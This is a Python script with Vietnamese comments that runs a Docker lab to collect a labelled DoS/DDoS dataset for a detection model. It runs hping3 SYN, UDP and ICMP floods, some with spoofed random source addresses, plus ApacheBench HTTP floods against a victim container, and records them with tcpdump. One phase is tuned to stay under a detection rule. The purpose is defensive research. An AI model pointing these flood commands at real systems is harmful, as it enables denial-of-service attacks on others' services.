#!/usr/bin/env python3
"""Thu MOT session dataset trong LAB DOCKER: dieu phoi bang 'docker exec', bat goi bang tcpdump
trong container detector (chung netns victim), ghi timeline theo DONG HO HOST. Chi dung trong lab.

Tai sao Docker (thay cho physical/SSH): spoof chay chac, nhieu nguon that san co (a1..a6),
tai lap tot, khong vuong WiFi. Moi mocs thoi gian lay tu time.time() cua HOST, va tcpdump dung
dong ho KERNEL HOST (container chung kernel) -> cung MOT dong ho -> gan nhan theo thoi gian
khong lech (rang buoc dong bo).

Nguon:
  - a6 (attacker6) = benign NEN RIENG, chay suot session (~5 pps). KHONG dung a6 de tan cong
    -> khong co container nao vua benign vua attack cung luc (nguon sach).
  - a1..a5 = nguon tan cong (va thanh vien flash-crowd o pha benign B2).

Dau ra (ve host, qua bind-mount ./detection -> /app trong detector):
  detection/cap/<session>.pcap      (tcpdump -s 100, ca 2 chieu host 172.30.0.10)
  detection/cap/<session>.timeline  (moi pha: epoch host + nhan) -> pcap_to_windows.py gan nhan

Chay (neu chua reload nhom docker: boc 'sg docker -c "..."'):
  python3 experiments/capture_session.py --session s1
  python3 experiments/capture_session.py --session s1 --dry-run   # chi IN ke hoach, KHONG chay
"""
import argparse
import os
import subprocess
import sys
import time

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
VICTIM = "172.30.0.10"
DETECTOR = "detector"
BENIGN_FLOOR = "attacker6"          # nguon benign nen RIENG (khong dung de tan cong)
ATTACKERS = ["attacker1", "attacker2", "attacker3", "attacker4", "attacker5"]  # a1..a5
ALL_CONTAINERS = [DETECTOR, "victim"] + ATTACKERS + [BENIGN_FLOOR]

# ===== bo lenh tan cong/benign (phan SAU 'docker exec <ct> timeout <dur>') =====
def c_syn(pps=None, spoof=False):
    a = ["hping3", "-S", "-p", "80", "-q"]
    if spoof:
        a.append("--rand-source")
    if pps is not None and pps > 0:
        a += ["-i", "u%d" % (1000000 // pps)]
    else:
        a.append("--flood")
    a.append(VICTIM)
    return a

def c_udp(pps=None, spoof=False):
    a = ["hping3", "--udp", "-p", "80", "-q"]
    if spoof:
        a.append("--rand-source")
    if pps is not None and pps > 0:
        a += ["-i", "u%d" % (1000000 // pps)]
    else:
        a.append("--flood")
    a.append(VICTIM)
    return a

def c_http(threads, dur, pps=0):
    return ["ab", "-k", "-c", str(threads), "-t", str(dur), "-n", "10000000", "http://%s/" % VICTIM]

def c_benign(pps, dur):
    return ["python3", "/app/benign_gen.py", VICTIM, "--pps", str(pps), "-d", str(dur)]

def c_icmp(gap_us, spoof=False):
    # hping3 ICMP co pacing (-i uN ~ 1e6/N pps). timeout boc ngoai dung dung thoi luong.
    a = ["hping3", "--icmp", "-q"]
    if spoof:
        a.append("--rand-source")
    a += ["-i", "u%d" % gap_us, VICTIM]
    return a


def build_phases(dur):
    """Ma tran 14 pha (jobs = list (container, argv)). a6 benign nen chay rieng, khong o day.
    Nhan: BENIGN / DoS / DDoS. Vector nam trong dac trung, khong nam trong nhan."""
    def jobs(conts, argv):
        return [(ct, argv) for ct in conts]
    a1 = ATTACKERS[:1]       # [attacker1]
    a12 = ATTACKERS[:2]      # a1,a2
    a123 = ATTACKERS[:3]     # a1..a3
    a15 = ATTACKERS[:5]      # a1..a5
    return [
        # --- BENIGN ---
        dict(name="B1", label="BENIGN", jobs=jobs(a12, c_benign(5, dur)),
             note="benign nhe 2 nguon (+ a6 nen)"),
        dict(name="B2", label="BENIGN", jobs=jobs(a15, c_benign(20, dur)),
             note="FLASH CROWD: 5(+1) nguon, per-src THAP (ca kho vs HTTP-DDoS)"),
        # --- DoS (1 nguon tan cong + a6 nen) ---
        dict(name="S1", label="DoS", jobs=jobs(a1, c_syn(pps=12)),
             note="SYN duoi nguong (pps 12: SYN non-spoof bi phan xa RST ~gap doi -> ~24+floor<40, luat bo sot)"),
        dict(name="S2", label="DoS", jobs=jobs(a1, c_syn(pps=300)), note="SYN mid"),
        dict(name="U1", label="DoS", jobs=jobs(a1, c_udp(pps=400)), note="UDP mid (nuoi udp_s)"),
        dict(name="H1", label="DoS", jobs=jobs(a1, c_http(20, dur, pps=150)),
             note="HTTP 1 nguon paced ~150 req/s (~0.8-1k pps, ack>>syn, dai thuc te)"),
        dict(name="I1", label="DoS", jobs=jobs(a1, c_icmp(5000)), note="ICMP ~200pps"),
        # --- DDoS spoof (1 container -> nhieu IP gia) ---
        dict(name="S3", label="DDoS", jobs=jobs(a1, c_syn(pps=1500, spoof=True)),
             note="SYN spoof cao (H_src cao)"),
        dict(name="U2", label="DDoS", jobs=jobs(a1, c_udp(pps=800, spoof=True)), note="UDP spoof"),
        dict(name="I2", label="DDoS", jobs=jobs(a1, c_icmp(2000, spoof=True)), note="ICMP spoof"),
        # --- DDoS nguon that nhieu container (khop demo + da dang pps) ---
        dict(name="D2s", label="DDoS", jobs=jobs(a12, c_syn(pps=150)),
             note="DUNG 2 nguon that, KHONG spoof (khop 2 may demo)"),
        dict(name="D2h", label="DDoS", jobs=jobs(a12, c_http(15, dur, pps=150)),
             note="2 nguon that L7 paced ~150 req/s/nguon (~1.5-2k pps tong, khop dai demo 2 may WiFi)"),
        dict(name="D3s", label="DDoS", jobs=jobs(a123, c_syn(pps=120)), note="3 nguon mid (da dang n_src)"),
        dict(name="D5h", label="DDoS", jobs=jobs(a15, c_http(20, dur, pps=120)),
             note="5 nguon paced ~120 req/s/nguon (~3-4k pps tong, muc 'cao' thuc te, tuong phan B2)"),
    ]


def docker(args):
    return ["docker"] + args


def preflight():
    # Kiem tra daemon + container dang chay.
    if subprocess.run(docker(["version"]), stdout=subprocess.DEVNULL,
                      stderr=subprocess.DEVNULL).returncode != 0:
        sys.exit("[X] Khong truy cap duoc Docker daemon. Thu: sg docker -c 'python3 %s ...'"
                 % os.path.relpath(__file__, ROOT))
    out = subprocess.run(docker(["ps", "--format", "{{.Names}}"]), capture_output=True, text=True).stdout
    running = set(out.split())
    missing = [c for c in ALL_CONTAINERS if c not in running]
    if missing:
        sys.exit("[X] Thieu container dang chay: %s\n    -> chay: docker compose up -d --build"
                 % ", ".join(missing))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--session", default=time.strftime("sess_%Y%m%d_%H%M%S"),
                    help="ten run (1 pcap = 1 run cho LORO)")
    ap.add_argument("--dur", type=int, default=30, help="thoi luong moi pha (giay)")
    ap.add_argument("--gap", type=int, default=10, help="nghi giua cac pha (giay, benign-only)")
    ap.add_argument("--floor-pps", type=float, default=2.0,
                    help="toc do benign nen tren a6 (req/s; 2 ~ 11 pps, du thap de S1 duoi nguong)")
    ap.add_argument("--dry-run", action="store_true", help="chi IN ke hoach + lenh, KHONG chay")
    args = ap.parse_args()

    phases = build_phases(args.dur)
    # uoc luong tong thoi gian de dat timeout cho benign nen (them margin)
    total = len(phases) * (args.dur + args.gap) + 60
    pcap_c = "/app/cap/%s.pcap" % args.session           # trong container detector
    pcap_h = os.path.join(ROOT, "detection", "cap", "%s.pcap" % args.session)
    tl_h = os.path.join(ROOT, "detection", "cap", "%s.timeline" % args.session)

    print("=== SESSION %s | %d pha | dur=%ds gap=%ds | pcap=%s ==="
          % (args.session, len(phases), args.dur, args.gap, os.path.relpath(pcap_h, ROOT)))
    print("    benign nen: %s @ %.0f pps (rieng, khong tan cong) | attack: %s"
          % (BENIGN_FLOOR, args.floor_pps, ",".join(ATTACKERS)))

    if args.dry_run:
        # In chinh xac moi lenh docker exec + ke hoach timeline, KHONG chay gi.
        print("\n[DRY-RUN] tcpdump:")
        print("  " + " ".join(docker(["exec", DETECTOR, "tcpdump", "-i", "eth0", "-s", "100",
                                       "-w", pcap_c, "ip", "host", VICTIM])))
        print("[DRY-RUN] benign nen (suot session):")
        print("  " + " ".join(docker(["exec", BENIGN_FLOOR, "timeout", str(total)]
                                      + c_benign(args.floor_pps, total))))
        t = 0.0
        for ph in phases:
            print("[DRY-RUN] t=%5.1fs  %-4s %-6s (%s)" % (t, ph["name"], ph["label"], ph["note"]))
            for ct, argv in ph["jobs"]:
                print("           " + " ".join(docker(["exec", ct, "timeout", str(args.dur)] + argv)))
            t += args.dur + args.gap
        print("\n[DRY-RUN] Khong chay gi. Bo --dry-run de thu that.")
        return

    preflight()
    os.makedirs(os.path.dirname(pcap_h), exist_ok=True)
    subprocess.run(docker(["exec", DETECTOR, "mkdir", "-p", "/app/cap"]), check=True)

    tdump = None
    floor = None
    tl = open(tl_h, "w")

    def log(ev, name, label):
        tl.write("%.6f %s %s %s\n" % (time.time(), ev, name, label))
        tl.flush()

    try:
        # bat tcpdump trong detector (chay nen)
        tdump = subprocess.Popen(docker(["exec", DETECTOR, "tcpdump", "-i", "eth0", "-s", "100",
                                         "-w", pcap_c, "ip", "host", VICTIM]),
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)  # cho tcpdump mo file
        log("SESSION_START", args.session, "-")

        # benign nen suot session tren a6 (chay nen)
        floor = subprocess.Popen(docker(["exec", BENIGN_FLOOR, "timeout", str(total)]
                                        + c_benign(args.floor_pps, total)),
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        for ph in phases:
            log("PHASE_START", ph["name"], ph["label"])
            print("[*] %-4s %-6s %s" % (ph["name"], ph["label"], ph["note"]))
            procs = [subprocess.Popen(docker(["exec", ct, "timeout", str(args.dur)] + argv),
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                     for ct, argv in ph["jobs"]]
            for p in procs:
                p.wait()
            log("PHASE_END", ph["name"], ph["label"])
            time.sleep(args.gap)   # nghi: chi con benign nen -> cua so BENIGN

        log("SESSION_END", args.session, "-")
    finally:
        # don dep: dung benign nen + tcpdump (flush) du co loi/Ctrl-C
        subprocess.run(docker(["exec", BENIGN_FLOOR, "pkill", "-f", "benign_gen.py"]),
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(docker(["exec", DETECTOR, "pkill", "-INT", "tcpdump"]),
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(2)
        if floor:
            floor.terminate()
        if tdump:
            tdump.terminate()
        tl.close()

    print("\n[*] Xong. pcap=%s  timeline=%s" % (os.path.relpath(pcap_h, ROOT), os.path.relpath(tl_h, ROOT)))
    print("    Trich dac trung: python3 ml/pcap_to_windows.py %s --timeline %s --run %s"
          % (os.path.relpath(pcap_h, ROOT), os.path.relpath(tl_h, ROOT), args.session))


if __name__ == "__main__":
    main()
